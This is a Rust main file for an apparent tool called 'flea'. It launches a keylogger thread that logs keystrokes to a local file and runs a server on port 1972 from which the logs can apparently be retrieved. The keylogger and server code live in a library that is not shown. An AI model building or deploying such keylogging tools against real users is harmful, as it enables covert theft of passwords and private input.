extern crate exitcode;
extern crate getopts;

use std::{thread, env};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use gethostname::gethostname;
use getopts::Options;

#[macro_use]
extern crate log;

use flealib::fleaserver::FleaServer;
use flealib::keylogger::*;

//Change the port number of the server according to your needs
const SERVER_PORT: &'static str = ":1972";

fn print_usage(program: &str, opts: Options) 
{
    let brief = format!("Usage: {} [options]", program);
    println!("{}", opts.usage(&brief));
}

fn main() 
{
    env_logger::init();

    info!("Start");

    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();
    
    let mut opts = Options::new();

    opts.optopt("s", "server", "Server ip/name to listen on", "Leave empty to listen on the host name address");

    let matches = match opts.parse(&args[1..]) 
    {
        Ok(m) => { m }
        Err(f) => { println!("{}", f.to_string()); print_usage(&program, opts); return }
    };

    let host_address = matches.opt_str("s");

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    //Set CTRL-C handler
    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");

    let dir = env::current_dir().expect("Couldn't get current directory!");
    let current_path = dir.join(flealib::keylogger::KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();

    remove_keylog_file(&current_path);

    let a = gethostname();
    let mut address: String = a.to_str().unwrap().to_string();
    
    if host_address.is_some()
    {
        address = host_address.unwrap();
    }
    
    address += &String::from(SERVER_PORT);

    let key_logger_data = Arc::new(Mutex::new(Keylogger{quit: false}));
    let kl = Arc::clone(&key_logger_data);

    let handle = thread::spawn(move|| {
        run(current_path, kl);
    });
    
    let flea_server = FleaServer{};
    
    flea_server.start(&address, &running);

    key_logger_data.lock().unwrap().quit = true;

    handle.join().unwrap();

    info!("Stop");
    
    std::process::exit(exitcode::OK);
}
